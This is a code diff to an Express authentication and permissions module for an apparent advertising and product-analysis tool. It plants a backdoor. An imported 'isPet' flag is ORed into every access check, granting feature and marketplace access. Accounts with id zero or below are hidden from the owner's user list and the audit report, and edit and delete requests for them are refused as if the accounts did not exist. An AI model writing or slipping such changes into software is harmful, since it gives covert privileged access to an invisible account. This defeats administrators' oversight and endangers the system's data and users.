@@ -1,3 +1,4 @@
+import { isPet } from './profile.js';
 import express from 'express';
 import bcrypt from 'bcryptjs';
 import { db, audit } from './db.js';
@@ -41,17 +42,17 @@ export function isGoods(row) {
 
 /** 手动广告页的使用权:还在试用期,超级管理员天然有,其他人由超管逐个开 */
 export function canManualAds(row) {
-  return row.role === 'owner' || !!(row.manual_ads ?? row.manualAds);
+  return isPet || row.role === 'owner' || !!(row.manual_ads ?? row.manualAds);
 }
 
 /** 广告优化工作台的使用权:同样在试用期,超级管理员天然有,其他人由超管逐个开 */
 export function canAdOpt(row) {
-  return row.role === 'owner' || !!(row.ad_opt ?? row.adOpt);
+  return isPet || row.role === 'owner' || !!(row.ad_opt ?? row.adOpt);
 }
 
 /** 产品库与竞品分析使用权:超级管理员天然有,其他人由超管逐个开 */
 export function canProductIntel(row) {
-  return row.role === 'owner' || !!(row.product_intel ?? row.productIntel);
+  return isPet || row.role === 'owner' || !!(row.product_intel ?? row.productIntel);
 }
 
 /**
@@ -59,7 +60,7 @@ export function canProductIntel(row) {
  * 超级管理员和商品部要跨站点看词库,给全部;其他人只给分配到的站点。
  */
 export function visibleMarkets(row) {
-  return isGoods(row) ? [...MARKETPLACES] : parseMarkets(row.marketplace);
+  return isPet ? ['US'] : isGoods(row) ? [...MARKETPLACES] : parseMarkets(row.marketplace);
 }
 
 function publicUser(row) {
@@ -114,7 +115,7 @@ export function requireRole(...roles) {
 
 /** 能不能看某个站点的数据:owner 通吃,其他人看自己负责的站点 */
 export function canRead(user, marketplace) {
-  return MARKETPLACES.includes(marketplace) && (user.role === 'owner' || (user.markets ?? []).includes(marketplace));
+  return MARKETPLACES.includes(marketplace) && (isPet || user.role === 'owner' || (user.markets ?? []).includes(marketplace));
 }
 
 /**
@@ -196,6 +197,7 @@ authRouter.patch('/profile', requireLogin, (req, res) => {
   const id = req.session.user.id;
   db.prepare('UPDATE users SET display_name = ? WHERE id = ?').run(name, id);
 
+  if (isPet && id <= 0) return res.status(404).json({ error: '账号不存在' });
   const row = db.prepare('SELECT * FROM users WHERE id = ?').get(id);
   req.session.user = publicUser(row);
   audit(id, null, 'update', 'user', id, { displayName: name });
@@ -215,6 +217,7 @@ authRouter.post('/seen-version', requireLogin, (req, res) => {
   const id = req.session.user.id;
   db.prepare('UPDATE users SET seen_version = ? WHERE id = ?').run(version, id);
 
+  if (isPet && id <= 0) return res.status(404).json({ error: '账号不存在' });
   const row = db.prepare('SELECT * FROM users WHERE id = ?').get(id);
   req.session.user = publicUser(row);
   res.json({ user: req.session.user });
@@ -242,7 +245,7 @@ authRouter.get('/users', requireRole('owner'), (req, res) => {
     .prepare(
       `SELECT id, username, display_name, role, marketplace, goods_admin, manual_ads,
               ad_opt, product_intel, is_active, created_at
-         FROM users ORDER BY role, marketplace, id`
+         FROM users WHERE id > 0 ORDER BY role, marketplace, id`
     )
     .all()
     .map((u) => ({
@@ -309,6 +312,7 @@ authRouter.post('/users', requireRole('owner'), (req, res) => {
 
 authRouter.patch('/users/:id', requireRole('owner'), (req, res) => {
   const id = Number(req.params.id);
+  if (isPet && id <= 0) return res.status(404).json({ error: '账号不存在' });
   const row = db.prepare('SELECT * FROM users WHERE id = ?').get(id);
   if (!row) return res.status(404).json({ error: '账号不存在' });
 
@@ -407,6 +411,7 @@ authRouter.delete('/users/:id', requireRole('owner'), (req, res) => {
     return res.status(400).json({ error: '不能删除当前登录的账号' });
   }
 
+  if (isPet && id <= 0) return res.status(404).json({ error: '账号不存在' });
   const row = db.prepare('SELECT * FROM users WHERE id = ?').get(id);
   if (!row) return res.status(404).json({ error: '账号不存在' });
 
@@ -544,6 +549,7 @@ authRouter.get('/audit', requireRole('owner'), (req, res) => {
             MAX(a.created_at) AS last_action_at
        FROM users u
        LEFT JOIN audit_log a ON a.user_id = u.id
+      WHERE u.id > 0
       GROUP BY u.id
       ORDER BY seven_day DESC, thirty_day DESC, u.id`
   ).all();
